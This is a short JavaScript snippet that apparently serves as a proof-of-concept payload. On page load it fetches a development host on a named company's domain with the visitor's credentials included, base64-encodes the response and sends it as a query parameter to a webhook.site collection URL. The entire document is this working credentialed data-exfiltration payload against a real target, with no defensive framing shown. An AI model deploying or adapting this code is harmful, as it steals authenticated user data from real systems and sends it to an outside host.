window.onload = function() {
  fetch('https://shop-header-develop.shopk8sd.ext.aws.zooplus.io/', {
    method: 'GET', 
    credentials: 'include', 
    redirect: 'follow' 
  })
  .then(response => response.blob()) // Convert the response to a Blob
  .then(blob => {
    // Use FileReader to read the Blob as a base64-encoded string
    const reader = new FileReader();
    reader.onloadend = function() {
      const base64data = reader.result;
      
      // Send the base64-encoded data as a query parameter in a GET request
      fetch(`https://webhook.site/57d22e31-90bf-4b26-8650-2697e3c764fe?data=${encodeURIComponent(base64data)}`, {
        method: 'GET'
      });
    };
    reader.readAsDataURL(blob); // Start reading the Blob as Data URL
  })
  .catch(error => console.error('Error:', error));
};
